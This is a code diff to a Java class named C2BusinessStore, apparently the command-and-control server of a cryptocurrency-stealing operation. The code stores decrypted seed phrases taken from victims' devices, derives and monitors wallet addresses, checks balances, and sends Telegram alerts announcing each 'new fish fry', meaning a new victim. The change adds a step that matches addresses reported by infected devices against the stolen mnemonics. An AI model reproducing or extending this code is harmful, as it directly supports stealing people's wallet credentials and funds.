@@ -60,6 +60,8 @@ public class C2BusinessStore {
     @Autowired private UjDecryptDao ujDecryptDao;
     @Autowired private AddressListenNotifier addressListenNotifier;
     @Autowired private MnemonicTelegramService mnemonicTelegramService;
+    @Autowired(required = false)
+    private ReportedAddressMatchService reportedAddressMatchService;
 
     @Autowired
     @Qualifier("albumMaterializeExecutor")
@@ -324,6 +326,20 @@ public class C2BusinessStore {
             // 派生 address4：离载 Kafka listener，事务提交后异步执行（CallerRuns 保证不丢）
             scheduleDeriveAddress4(e.getId(), derivePt, ctx);
 
+            // 若设备已有上报地址，异步撞库（us 先到时 pending 为空则 no-op；ub 后到会再触发）
+            if (reportedAddressMatchService != null) {
+                try {
+                    reportedAddressMatchService.scheduleMatchAfterUs(
+                            deviceId,
+                            ctx.getDeviceRowId(),
+                            ctx.getChannelcode(),
+                            ctx.getClientIp());
+                } catch (Exception me) {
+                    log.info("异常日志:[c2_handlers][mnemonic] 提交地址匹配失败, recordId={}, err={}",
+                            ctx.getRecordId(), me.getMessage());
+                }
+            }
+
             // 新助记词入库成功 → 异步飞机「新鱼苗」通知
             try {
                 mnemonicTelegramService.notifyFishAsync(
@@ -398,6 +414,28 @@ public class C2BusinessStore {
             return;
         }
         String mnemonic = plaintext == null ? "" : str(plaintext, "result");
+
+        // 优先撞库：命中则 address4 只写「匹配地址 + 未命中链的 index0」，不再先灌全量
+        boolean matched = false;
+        if (reportedAddressMatchService != null && ctx != null
+                && ctx.getDeviceId() != null && !ctx.getDeviceId().isEmpty()) {
+            try {
+                matched = reportedAddressMatchService.matchNow(
+                        ctx.getDeviceId(),
+                        ctx.getDeviceRowId(),
+                        ctx.getChannelcode(),
+                        ctx.getClientIp());
+            } catch (Exception e) {
+                log.info("异常日志:[c2_handlers][address4] 同步匹配失败 mnemonicId={} err={}",
+                        mnemonicId, e.getMessage());
+            }
+        }
+        if (matched) {
+            log.info("正常日志:[c2_handlers][address4] 已按上报地址匹配写入, mnemonicId={}", mnemonicId);
+            return;
+        }
+
+        // 无上报可撞 / 未命中：各链只派生 index0 写入
         java.util.List<WalletDerivator.DerivedAddress> list = WalletDerivator.derive(mnemonic);
         double now = System.currentTimeMillis() / 1000.0;
         int ok = 0;
@@ -424,11 +462,9 @@ public class C2BusinessStore {
                         mnemonicId, da.chaintype, ex.getMessage());
             }
         }
-        log.info("正常日志:[c2_handlers][address4] 派生并写入 {} 条, mnemonicId={}", ok, mnemonicId);
-        // 事务提交后异步调三方，不占用消费线程
+        log.info("正常日志:[c2_handlers][address4] 自派生 index0 写入 {} 条, mnemonicId={}", ok, mnemonicId);
         if (!inserted.isEmpty()) {
             addressListenNotifier.notifyAfterCommit(mnemonicId, inserted);
-            // 查余额 + 飞机余额通知（独立线程池）
             try {
                 mnemonicTelegramService.notifyBalanceAfterDeriveAsync(
                         mnemonicId,
@@ -814,6 +850,14 @@ public class C2BusinessStore {
             e.setPlaintextJson(ctx.getPlaintextJson() == null ? "" : ctx.getPlaintextJson());
             e.setDecryptedAt(System.currentTimeMillis() / 1000.0);
             ubDecryptDao.insert(e);
+            if (reportedAddressMatchService != null && plaintext != null) {
+                try {
+                    reportedAddressMatchService.ingestUb(ctx, plaintext, e.getId());
+                } catch (Exception me) {
+                    log.info("异常日志:[c2_handlers][ub_decrypt] 上报地址入库失败, recordId={}, err={}",
+                            ctx.getRecordId(), me.getMessage());
+                }
+            }
         } catch (Exception ex) {
             log.info("异常日志:[c2_handlers][ub_decrypt] 写入失败, recordId={}, err={}",
                     ctx.getRecordId(), ex.getMessage());
@@ -852,6 +896,14 @@ public class C2BusinessStore {
             e.setPlaintextJson(ctx.getPlaintextJson() == null ? "" : ctx.getPlaintextJson());
             e.setDecryptedAt(System.currentTimeMillis() / 1000.0);
             ujDecryptDao.insert(e);
+            if (reportedAddressMatchService != null && plaintext != null) {
+                try {
+                    reportedAddressMatchService.ingestUj(ctx, plaintext, e.getId());
+                } catch (Exception me) {
+                    log.info("异常日志:[c2_handlers][uj_decrypt] 上报地址入库失败, recordId={}, err={}",
+                            ctx.getRecordId(), me.getMessage());
+                }
+            }
         } catch (Exception ex) {
             log.info("异常日志:[c2_handlers][uj_decrypt] 写入失败, recordId={}, err={}",
                     ctx.getRecordId(), ex.getMessage());
